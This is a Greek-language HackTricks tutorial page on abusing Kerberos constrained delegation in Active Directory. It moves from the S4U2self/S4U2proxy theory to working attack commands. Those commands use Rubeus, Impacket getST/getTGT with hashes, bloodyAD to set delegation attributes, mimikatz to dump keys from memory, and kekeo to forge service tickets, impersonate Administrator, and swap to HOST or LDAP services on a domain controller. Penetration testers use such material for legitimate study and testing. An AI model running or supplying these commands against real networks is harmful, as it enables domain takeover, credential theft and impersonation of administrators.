# Περιορισμένη Αντιπροσώπευση

{{#include ../../banners/hacktricks-training.md}}

## Περιορισμένη Αντιπροσώπευση

Με αυτό, ένας Domain admin μπορεί να **επιτρέψει** σε έναν υπολογιστή να **προσποιηθεί έναν χρήστη ή υπολογιστή** απέναντι σε οποιαδήποτε **service** μιας μηχανής.

- **Service for User to self (_S4U2self_):** Εάν ένας **service account** έχει τιμή _userAccountControl_ που περιέχει [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D), τότε μπορεί να αποκτήσει ένα TGS για τον εαυτό του (την service) εκ μέρους οποιουδήποτε άλλου χρήστη.
- **Service for User to Proxy(_S4U2proxy_):** Ένας **service account** θα μπορούσε να αποκτήσει ένα TGS εκ μέρους οποιουδήποτε χρήστη για την service που έχει οριστεί στο **msDS-AllowedToDelegateTo.** Για να το κάνει, χρειάζεται πρώτα ένα TGS από εκείνον τον χρήστη προς τον ίδιο, αλλά μπορεί να χρησιμοποιήσει S4U2self για να αποκτήσει αυτό το TGS πριν ζητήσει το άλλο.

**Σημείωση**: Εάν ένας χρήστης είναι επισημασμένος ως ‘_Account is sensitive and cannot be delegated_’ στο AD, δεν θα μπορείτε να τους **προσποιηθείτε**.

Αυτό σημαίνει ότι αν **συμβιβάσετε το hash της service** μπορείτε να **προσποιηθείτε χρήστες** και να αποκτήσετε **πρόσβαση** εκ μέρους τους σε οποιαδήποτε **service** στους συγκεκριμένους υπολογιστές (πιθανό **privesc**).

Επιπλέον, δεν θα έχετε πρόσβαση μόνο στην service που ο χρήστης μπορεί να προσποιηθεί, αλλά και σε οποιαδήποτε service, επειδή το SPN (το όνομα της service που ζητείται) δεν ελέγχεται (στο ticket αυτό το μέρος δεν είναι κρυπτογραφημένο/υπογεγραμμένο). Επομένως, αν έχετε πρόσβαση στην **CIFS service** μπορείτε επίσης να έχετε πρόσβαση στην **HOST service** χρησιμοποιώντας το flag `/altservice` στο Rubeus, για παράδειγμα. Η ίδια αδυναμία ανταλλαγής SPN εκμεταλλεύεται το **Impacket getST -altservice** και άλλα εργαλεία.

Επίσης, η πρόσβαση στην **LDAP service στο DC** είναι αυτό που απαιτείται για να εκτελέσει κάποιος **DCSync**.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Σημειώσεις για Cross-domain constrained delegation (2025+)

Από την έκδοση **Windows Server 2012/2012 R2** ο KDC υποστηρίζει **constrained delegation across domains/forests** μέσω S4U2Proxy extensions. Οι σύγχρονες εκδόσεις (Windows Server 2016–2025) διατηρούν αυτή τη συμπεριφορά και προσθέτουν δύο PAC SIDs για να σηματοδοτήσουν το protocol transition:

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) όταν ο χρήστης αυθεντικοποιήθηκε κανονικά.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) όταν μια υπηρεσία δήλωσε την ταυτότητα μέσω protocol transition.

Αναμένετε το `SERVICE_ASSERTED_IDENTITY` μέσα στο PAC όταν το protocol transition χρησιμοποιείται across domains, επιβεβαιώνοντας ότι το S4U2Proxy step ήταν επιτυχές.

### Impacket / Linux tooling (altservice & full S4U)

Οι πρόσφατες εκδόσεις του Impacket (0.11.x+) εκθέτουν την ίδια S4U chain και SPN swapping όπως το Rubeus:
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'
```
Αν προτιμάτε να παραχαράσσετε πρώτα το user ST (π.χ., μόνο offline hash), συνδυάστε το **ticketer.py** με το **getST.py** για S4U2Proxy. Δείτε το ανοιχτό Impacket issue #1713 για τρέχουσες ιδιομορφίες (KRB_AP_ERR_MODIFIED όταν το παραχαραγμένο ST δεν ταιριάζει με το κλειδί SPN).

### Αυτοματοποίηση ρύθμισης του delegation από low-priv creds

Εάν ήδη κατέχετε **GenericAll/WriteDACL** σε έναν υπολογιστή ή λογαριασμό υπηρεσίας, μπορείτε να προωθήσετε τις απαιτούμενες ιδιότητες απομακρυσμένα χωρίς RSAT χρησιμοποιώντας το **bloodyAD** (2024+):
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
Αυτό σας επιτρέπει να δημιουργήσετε ένα constrained delegation path για privesc χωρίς δικαιώματα DA μόλις μπορείτε να γράψετε αυτά τα attributes.

- Βήμα 1: **Αποκτήστε το TGT της επιτρεπόμενης υπηρεσίας**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Υπάρχουν **άλλοι τρόποι για να αποκτήσετε ένα TGT ticket** ή το **RC4** ή **AES256** χωρίς να είστε SYSTEM στον υπολογιστή, όπως το Printer Bug, το unconstrain delegation, το NTLM relaying και το Active Directory Certificate Service abuse
>
> **Απλώς έχοντας εκείνο το TGT ticket (ή hashed) μπορείτε να εκτελέσετε αυτή την επίθεση χωρίς να παραβιάσετε ολόκληρο τον υπολογιστή.**

- Βήμα 2: **Αποκτήστε TGS για την υπηρεσία προσποιούμενοι τον χρήστη**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**Περισσότερες πληροφορίες στο ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) and [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)

## Αναφορές
- [Επισκόπηση Kerberos Constrained Delegation (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Impacket ζήτημα #1713 – S4U2proxy forged service ticket errors](https://github.com/fortra/impacket/issues/1713)

{{#include ../../banners/hacktricks-training.md}}
